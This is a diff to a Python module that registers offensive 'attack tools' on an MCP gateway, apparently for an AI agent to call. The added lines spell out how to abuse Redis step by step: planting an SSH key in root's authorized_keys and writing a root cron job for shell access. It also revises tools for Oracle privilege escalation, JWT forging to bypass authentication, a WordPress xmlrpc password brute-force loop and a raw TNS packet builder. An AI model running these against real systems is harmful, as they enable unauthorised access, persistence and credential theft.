@@ -896,7 +896,7 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     gateway.register_shell_tool(
         name="redis_cmd",
         command_template="redis-cli -h {host} -p {port} {command} 2>&1",
-        description="Execute a command on a Redis server. Use for data extraction (KEYS *, GET key), writing SSH keys (CONFIG SET dir, CONFIG SET dbfilename), and module loading.",
+        description="Execute a single command on a Redis server. Call once per command. Use for data extraction (KEYS *, GET key). SSH key injection requires a CHAIN of separate calls: redis_cmd(host,port,'CONFIG SET dir /root/.ssh') → redis_cmd(host,port,'CONFIG SET dbfilename authorized_keys') → redis_cmd(host,port,'SET key \"\\n\\nssh-rsa AA...\"') → redis_cmd(host,port,'SAVE'). Cron shell: CONFIG SET dir /var/spool/cron/crontabs → CONFIG SET dbfilename root → SET key 'cmd' → SAVE. Also: CONFIG GET (check config), FLUSHALL (clear data), INFO (server info).",
         parameters={
             "host": {"type": "string", "description": "Redis host IP or hostname"},
             "port": {"type": "integer", "description": "Redis port (default 6379)"},
@@ -921,7 +921,7 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     )
     gateway.register_shell_tool(
         name="oracle_query",
-        command_template="sqlplus -S {user}/{password}@//{host}:{port}/{sid} <<< '{query}' 2>&1",
+        command_template="printf '%s\n' '{query}' | sqlplus -S {user}/{password}@//{host}:{port}/{sid} 2>&1",
         description="Execute a SQL query on an Oracle Database. Use for data extraction, privilege escalation via PL/SQL, and TNS listener interaction.",
         parameters={
             "host": {"type": "string", "description": "Oracle host IP or hostname"},
@@ -936,12 +936,12 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     )
     gateway.register_shell_tool(
         name="jwt_forge",
-        command_template="python3 -c \"import jwt,json,time; payload=json.loads('{claims}'); print(jwt.encode(payload,'{secret}',algorithm='{algorithm}'))\" 2>&1",
-        description="Forge a JSON Web Token (JWT) using a known secret or signing key. Use for authentication bypass when a JWT secret is hardcoded or discovered. Pass claims as JSON string.",
+        command_template="python3 -c \"import jwt,json,time,base64; payload=json.loads(base64.b64decode('{claims_b64}').decode()); print(jwt.encode(payload,'{secret}',algorithm='{algorithm}'))\" 2>&1",
+        description="Forge a JSON Web Token (JWT) using a known secret or signing key. Use for authentication bypass when a JWT secret is hardcoded or discovered. Pass claims as base64-encoded JSON string (use base64.b64encode on the JSON claims).",
         parameters={
             "secret": {"type": "string", "description": "JWT signing secret or key"},
             "algorithm": {"type": "string", "description": "JWT algorithm (HS256, HS384, HS512, RS256). Default HS256."},
-            "claims": {"type": "string", "description": "JSON claims payload (e.g. '{\\\"sub\\\":\\\"admin\\\"}')"},
+            "claims_b64": {"type": "string", "description": "Base64-encoded JSON claims payload (e.g. base64 of '{\"sub\":\"admin\"}')"},
         },
         parser=_parse_shell_output,
         timeout=15,
@@ -1113,8 +1113,8 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
             "python3 -c \"\n"
             "import requests, sys\n"
             "url = '{target_url}/xmlrpc.php'\n"
-            "users = ['{users}']\n"
-            "passwords = ['{passwords}']\n"
+            "users = '{users}'.split(',')\n"
+            "passwords = '{passwords}'.split(',')\n"
             "for u in users:\n"
             "    for p in passwords:\n"
             "        xml = '''<?xml version=\\\\\\\"1.0\\\\\\\"?><methodCall><methodName>wp.getUsers</methodName>"
@@ -1148,9 +1148,9 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
             "host = '{target_host}'\n"
             "port = {tns_port}\n"
             "sid = '{sid}'\n"
-            "desc = f'(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST={{host}})(PORT=port))(CONNECT_DATA=(SID={{sid}})))'\n"
+            "desc = f'(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST={{host}})(PORT={{port}}))(CONNECT_DATA=(SID={{sid}})))'\n"
             "payload = desc.encode()\n"
-            "pkt_len = len(payload)\n"
+            "pkt_len = len(payload) + 8\n"
             "header = struct.pack('>HH', pkt_len, 6) + b'\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00'\n"
             "sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
             "sock.settimeout(10)\n"
